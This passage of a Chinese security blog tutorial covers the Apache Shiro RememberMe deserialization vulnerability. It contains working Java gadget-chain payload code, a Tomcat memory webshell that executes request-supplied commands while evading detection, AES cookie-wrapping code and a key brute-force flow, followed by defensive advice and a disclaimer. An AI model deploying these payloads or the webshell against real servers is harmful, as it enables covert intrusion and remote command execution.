+<h3 id="6-3-关键代码"><a href="#6-3-关键代码" class="headerlink" title="6.3 关键代码"></a>6.3 关键代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(<span class="type">byte</span>[] bytecode) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line">    setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;PwnRCE&quot;</span>);</span><br><span class="line">    setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">    <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(</span><br><span class="line">        <span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">    PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>);</span><br><span class="line">    queue.add(<span class="string">&quot;a&quot;</span>); queue.add(<span class="string">&quot;b&quot;</span>);</span><br><span class="line"></span><br><span class="line">    setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">    setFieldValue(queue, <span class="string">&quot;comparator&quot;</span>, comparator);</span><br><span class="line">    setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos).writeObject(queue);</span><br><span class="line">    <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-4-链选择策略"><a href="#6-4-链选择策略" class="headerlink" title="6.4 链选择策略"></a>6.4 链选择策略</h3><table>
+<thead>
+<tr>
+<th>场景</th>
+<th>推荐链</th>
+<th>所需依赖</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Tomcat 常见项目</td>
+<td>CommonsBeanutils1</td>
+<td>commons-beanutils</td>
+</tr>
+<tr>
+<td>JBoss&#x2F;WildFly</td>
+<td>CommonsCollections</td>
+<td>commons-collections</td>
+</tr>
+<tr>
+<td>内网低版本 JDK</td>
+<td>Jdk7u21</td>
+<td>无额外依赖</td>
+</tr>
+<tr>
+<td>Spring Boot 2.x</td>
+<td>CommonsBeanutils2</td>
+<td>beanutils + logging</td>
+</tr>
+<tr>
+<td>仅探测</td>
+<td>URLDNS（无危害）</td>
+<td>无</td>
+</tr>
+</tbody></table>
+<h2 id="七、内存马注入"><a href="#七、内存马注入" class="headerlink" title="七、内存马注入"></a>七、内存马注入</h2><h3 id="7-1-动机"><a href="#7-1-动机" class="headerlink" title="7.1 动机"></a>7.1 动机</h3><p>传统 Webshell 落盘存在 HIDS&#x2F;EDR 扫描、无写入权限、日志留痕等问题。内存马驻留 JVM 堆中，<strong>无文件落地</strong>，绕过传统检测。</p>
+<h3 id="7-2-Filter-型注入"><a href="#7-2-Filter-型注入" class="headerlink" title="7.2 Filter 型注入"></a>7.2 Filter 型注入</h3><p>Tomcat 管道：<code>Request → FilterChain → Filter₁ → ... → Servlet → Response</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取 Context</span></span><br><span class="line"><span class="type">WebappClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (WebappClassLoader)</span><br><span class="line">    Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">ctx</span> <span class="operator">=</span> (StandardContext)</span><br><span class="line">    loader.getResources().getContext();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 恶意 Filter</span></span><br><span class="line"><span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse resp,</span></span><br><span class="line"><span class="params">            FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> ((HttpServletRequest)req).getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">            <span class="comment">// 读取输出写入 response（省略 IO）</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        chain.doFilter(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig c)</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动态注册</span></span><br><span class="line"><span class="type">FilterDef</span> <span class="variable">def</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">def.setFilterName(<span class="string">&quot;SessionFilter&quot;</span>);</span><br><span class="line">def.setFilterClass(filter.getClass().getName());</span><br><span class="line">def.setFilter(filter);</span><br><span class="line">ctx.addFilterDef(def);</span><br><span class="line"><span class="type">FilterMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">map.setFilterName(<span class="string">&quot;SessionFilter&quot;</span>);</span><br><span class="line">map.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">ctx.addFilterMapBefore(map);</span><br><span class="line"><span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> StandardContext.class.getDeclaredMethod(<span class="string">&quot;filterStart&quot;</span>);</span><br><span class="line">m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">m.invoke(ctx);</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-3-持久化"><a href="#7-3-持久化" class="headerlink" title="7.3 持久化"></a>7.3 持久化</h3><p>单次注入在应用重启后失效。长期维持可结合 JNDI 注入或定时任务重注入；使用 Javassist 修改已有 Filter 类可提高隐蔽性。</p>
+<h2 id="八、检测与工具链"><a href="#八、检测与工具链" class="headerlink" title="八、检测与工具链"></a>八、检测与工具链</h2><h3 id="8-1-被动指纹识别"><a href="#8-1-被动指纹识别" class="headerlink" title="8.1 被动指纹识别"></a>8.1 被动指纹识别</h3><p>响应头中出现即确认 Shiro 存在：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: rememberMe=deleteMe; Path=/; Max-Age=0; ...</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-2-主动探测"><a href="#8-2-主动探测" class="headerlink" title="8.2 主动探测"></a>8.2 主动探测</h3><p>使用 URLDNS 链 + DNSLog 进行无危害验证：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wrap_payload</span>(<span class="params">payload_bytes, key_b64</span>):</span><br><span class="line">    key = base64.b64decode(key_b64)</span><br><span class="line">    iv = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">16</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="comment"># PKCS7 padding</span></span><br><span class="line">    pad_len = <span class="number">16</span> - <span class="built_in">len</span>(payload_bytes) % <span class="number">16</span></span><br><span class="line">    payload_bytes += <span class="built_in">bytes</span>([pad_len] * pad_len)</span><br><span class="line">    encrypted = cipher.encrypt(payload_bytes)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(encrypted).decode()</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-3-工具生态"><a href="#8-3-工具生态" class="headerlink" title="8.3 工具生态"></a>8.3 工具生态</h3><table>
+<thead>
+<tr>
+<th>工具</th>
+<th>用途</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ShiroExploit（GUI）</td>
+<td>检测与利用</td>
+<td>多链支持，图形界面</td>
+</tr>
+<tr>
+<td>shiro_attack（CLI）</td>
+<td>批量检测+内存马</td>
+<td>单目标与批量模式</td>
+</tr>
+<tr>
+<td>Burp 插件 ShiroScan</td>
+<td>被动扫描</td>
+<td>自动识别 Cookie</td>
+</tr>
+<tr>
+<td>nuclei 模板</td>
+<td>自动化扫描</td>
+<td>CI&#x2F;CD 集成</td>
+</tr>
+<tr>
+<td>Fofa&#x2F;Shodan</td>
+<td>资产测绘</td>
+<td>Shiro 特征指纹</td>
+</tr>
+</tbody></table>
+<h3 id="8-4-Key-爆破流程"><a href="#8-4-Key-爆破流程" class="headerlink" title="8.4 Key 爆破流程"></a>8.4 Key 爆破流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">已知密钥库（~3000 个）</span><br><span class="line">      │</span><br><span class="line">      ▼</span><br><span class="line">┌───────────────────────┐</span><br><span class="line">│ 发包: encrypt(URLDNS) │</span><br><span class="line">└─────────┬─────────────┘</span><br><span class="line">          ▼</span><br><span class="line">  ┌───────────────┐</span><br><span class="line">  │ DNSLog 收到回显?│──是──&gt; 密钥有效，漏洞确认</span><br><span class="line">  └───────┬───────┘</span><br><span class="line">          │否</span><br><span class="line">          ▼</span><br><span class="line">  尝试下一个密钥</span><br></pre></td></tr></table></figure>
+
+<h2 id="九、防御建议"><a href="#九、防御建议" class="headerlink" title="九、防御建议"></a>九、防御建议</h2><p><strong>开发侧</strong>：</p>
+<ul>
+<li>升级至 Shiro 1.10.0+，高版本内置类白名单机制。</li>
+<li>使用随机高熵密钥并通过环境变量注入，绝不硬编码。</li>
+<li>实现 <code>ClassResolvingObjectInputStream</code> 限制可反序列化类。</li>
+<li>丢弃异常长的 Cookie（正常 RememberMe &lt; 1KB）。</li>
+</ul>
+<p><strong>运维侧</strong>：</p>
+<ul>
+<li>WAF 检测 Cookie 中 Base64 长度 &gt; 3KB 或含序列化魔数 <code>aced0005</code> 的请求。</li>
+<li>RASP 在 <code>ObjectInputStream.resolveClass()</code> 级别拦截非白名单类。</li>
+<li>监控频繁的 <code>PaddingException</code>，可能是 Padding Oracle 攻击。</li>
+</ul>
+<h2 id="十、免责声明"><a href="#十、免责声明" class="headerlink" title="十、免责声明"></a>十、免责声明</h2><blockquote>
+<p><strong>本文所述技术仅供安全研究与授权测试使用。</strong> 任何个人或组织在未获得系统所有者明确书面授权的情况下，利用本文所述技术对系统进行测试、攻击或入侵均属违法行为。作者不对因误用、滥用本文信息而造成的任何直接或间接损失及法律责任负责。</p>
+<p>渗透测试人员在验证 Shiro 漏洞前，必须确保已签署有效授权协议。非授权场景下即使仅发送 DNSLog 探测流量，也可能触及《网络安全法》《刑法》等规定。</p>
+</blockquote>
+<h2 id="十一、总结"><a href="#十一、总结" class="headerlink" title="十一、总结"></a>十一、总结</h2><p>Shiro RememberMe 反序列化漏洞披露已逾十年，但因门槛低、影响广、绕过多，授权渗透测试中检出率依然很高。理解 Shiro-550 与 Shiro-721 的差异、掌握无依赖 Gadget 链构造、熟悉内存马注入流程、善用检测工具链，是处置该类漏洞的关键。安全不在于发现一个漏洞然后修补它，而在于建立纵深防御体系，让攻击者在每一层都付出高昂成本。</p>
+<hr>
+<p><strong>参考资料</strong></p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://shiro.apache.org/security-reports.html">Apache Shiro Security Reports — CVE-2016-4437</a></li>
+<li><a target="_blank" rel="noopener" href="https://shiro.apache.org/security-reports.html">Apache Shiro Security Reports — CVE-2019-12422</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial — CommonsBeanutils1</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings">phith0n — Java安全漫谈</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/j1anFen/shiro_attack">shiro_attack 工具集</a></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/" rel="tag"># 框架安全</a>
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Database-Redis-security/" rel="prev" title="Redis安全攻击面">
+                  <i class="fa fa-angle-left"></i> Redis安全攻击面
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Crypto-hash-cracking/" rel="next" title="Hash破解：从识别到爆破">
+                  Hash破解：从识别到爆破 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
